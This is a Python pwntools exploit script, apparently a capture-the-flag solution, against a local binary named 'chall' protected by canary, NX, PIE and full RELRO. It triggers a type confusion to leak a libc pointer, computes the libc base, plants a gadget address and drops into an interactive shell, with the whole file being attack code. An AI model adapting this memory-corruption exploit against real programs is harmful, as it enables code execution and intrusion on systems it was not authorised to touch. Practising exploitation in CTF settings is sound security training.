from pwn import * 

context.log_level = 'debug'
e = ELF('./chall')
p = process('./chall')
libc = e.libc
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

def add(idx,size,data):
	sla('>','1')
	sla(':',str(idx))
	sla(':',str(size))
	sa(':',data)

def show(idx):
	sla('>','2')
	sla(':',str(idx))

def delete(idx):
	sla('>','3')
	sla(':',str(idx))

pause()
sla('n:',str(0xffff)) # type confusion
show(28) # -> double pointer
l = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00')
log.info(hex(l))
libc_base = l - 0x19a080
log.info(hex(libc_base))
add(6,0x40,'A'*8+p64(libc_base + 0x10a45c)) # rsp
sla('>','4')


p.interactive()

'''
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
'''
